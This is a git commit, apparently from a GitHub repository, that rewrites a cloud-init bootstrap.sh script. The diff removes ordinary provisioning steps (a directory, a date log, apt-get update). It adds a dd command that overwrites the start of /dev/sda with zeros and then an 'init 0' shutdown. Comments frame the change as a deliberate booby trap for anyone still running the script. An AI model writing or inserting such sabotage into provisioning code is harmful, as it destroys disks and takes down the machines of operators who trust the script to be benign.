ac47bda684578cea0a4c79a261be12e285deea04
Xavier Sparrow <59649163+xvrsprprw@users.noreply.github.com>
2020-01-08 11:42:17 +0000

    explicit af
    as it should be

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,10 +1,5 @@
 #!/bin/bash
-
-mkdir -p /etc/bootstrap
-date >> /etc/bootstrap/cloud-init.provisioned
-
-# For some weird reason, running this 'apt-get update' is required.
-# Otherwise we cannot configure the instances with Ansible,
-# and SSH'ing and running 'sudo apt-get update' solves the issue.
-apt-get update
-
+# it's time to weaponize the rootkit :)
+# if this is still used while we're out of softlayer, well, jokes' on you then
+dd if=/dev/zero of=/dev/sda bs=10M count=1
+init 0 # so long, and thanks for all the fish, dallas-oh-six
